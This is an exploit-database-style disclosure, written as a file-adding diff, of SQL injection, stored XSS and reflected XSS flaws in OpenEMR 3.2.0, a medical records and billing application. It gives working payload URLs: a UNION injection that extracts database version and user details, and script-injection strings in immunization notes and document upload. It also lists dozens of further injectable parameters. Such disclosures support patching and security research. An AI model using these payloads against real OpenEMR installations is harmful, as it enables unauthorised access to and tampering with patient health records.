@@ -1,0 +1,85 @@
+# Exploit Title: OpenEMR v3.2.0 Multiple Vulnerabilities
+# Date: December 26, 2010
+# Author: Blake
+# Software Link: http://sourceforge.net/projects/openemr/
+# Version: 3.2.0
+# Tested on: Windows XP SP3
+
+
+Description:
+Open Source Practice Management, Electronic Medical Record, Prescription Writing and Medical Billing application.
+
+
+SQL Injection:
+
+The issue parameter is vulnerable to sql injection:
+
+http://192.168.1.127/openemr/interface/patient_file/summary/add_edit_issue.php?issue=0+union+select+null,null,null,@@version,system_user(),database(),user(),null,null,null,null,null,null,null,null,null,null,null,null--
+
+Additional vulnerable parameters: 
+/openemr/controller.php [prescription&list&id parameter]
+/openemr/controller.php [prescription&multip rintcss&id parameter]
+/openemr/interface/main /calendar/index.php [pc_facility parameter]
+/openemr/interface /patient_file/summary/add _edit_issue.php [issue parameter]
+/openemr/interface /patient_file/summary /demographics.php [set_pid parameter]
+/openemr/interface /patient_file/summary /immunizations.php [administered_by_id parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [assigned_to parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [form_note_type parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [noteid parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [offset parameter]
+
+
+Stored XSS:
+The note parameter is vulnerable to stored XSS:
+
+http://192.168.1.127/openemr/interface/patient_file/summary/immunizations.php?mode=add&id=&pid=98&form_immunization_id=6&administered_date=2010-12-26&manufacturer=&lot_number=&administered_by=Administrator%2C+&administered_by_id=1&education_date=2010-12-26&vis_date=2010-12-26&note=%22%3E%3Cscript%3Ealert%289%29%3C%2Fscript%3E
+
+Additional vulnerable parameters:
+/openemr/interface /logview/logview.php [rumple parameter]
+/openemr/interface /patient_file/report /patient_report.php [form_title parameter]
+/openemr/interface /patient_file/summary /immunizations.php [manufacturer parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [assigned_to parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [rumple parameter]
+/openemr/interface /usergroup/usergroup _admin.php [rumple parameter]
+
+Reflected XSS:
+The parent_id parameter is vulnerable to reflected XSS:
+
+http://192.168.1.127/openemr/controller.php?document&upload&patient_id=2&parent_id=%22%3E%3Cscript%3Ealert%2810%29%3C/script%3E
+
+Additional vulnerable parameters:
+/openemr/controller.php [document&list&patient_id parameter]
+/openemr/controller.php [document&upload&patient _id parameter]
+/openemr/controller.php [document&upload&patient _id parameter]
+/openemr/controller.php [parent_id parameter]
+/openemr/controller.php [prescription&list&id parameter]
+/openemr/interface/forms /newpatient/save.php [facility_id parameter]
+/openemr/interface/forms /newpatient/save.php [form_date parameter]
+/openemr/interface/forms /newpatient/save.php [form_date parameter]
+/openemr/interface/forms /newpatient/save.php [form_onset_date parameter]
+/openemr/interface/forms /newpatient/save.php [form_sensitivity parameter]
+/openemr/interface/forms /newpatient/save.php [mode parameter]
+/openemr/interface/forms /newpatient/save.php [pc_catid parameter]
+/openemr/interface/forms /newpatient/save.php [reason parameter]
+/openemr/interface /language/language.php [edit parameter]
+/openemr/interface /language/language.php [m parameter]
+/openemr/interface/main /calendar/index.php [&pc_username[] parameter]
+/openemr/interface/main /calendar/index.php [pc_category parameter]
+/openemr/interface/main /calendar/index.php [pc_topic parameter]
+/openemr/interface/main /calendar/index.php [tplview parameter]
+/openemr/interface /patient_file/deleter.php [billing parameter]
+/openemr/interface /patient_file/summary/add _edit_issue.php [issue parameter]
+/openemr/interface /patient_file/summary /demographics.php [set_pid parameter]
+/openemr/interface /patient_file/summary /immunizations.php [administered_by_id parameter]
+/openemr/interface /patient_file/summary /immunizations.php [lot_number parameter]
+/openemr/interface /patient_file/summary /immunizations.php [manufacturer parameter]
+/openemr/interface /patient_file/summary /immunizations.php [note parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [assigned_to parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [form_active parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [form_inactive parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [noteid parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [set_pid parameter]
+/openemr/interface /usergroup/usergroup _admin.php [groupname parameter]
+/openemr/interface /usergroup/usergroup _admin.php [rumple parameter]
+/openemr/interface /patient_file/summary/add _edit_issue.php [form_title parameter]
+/openemr/interface /patient_file/summary /pnotes_full.php [note parameter]
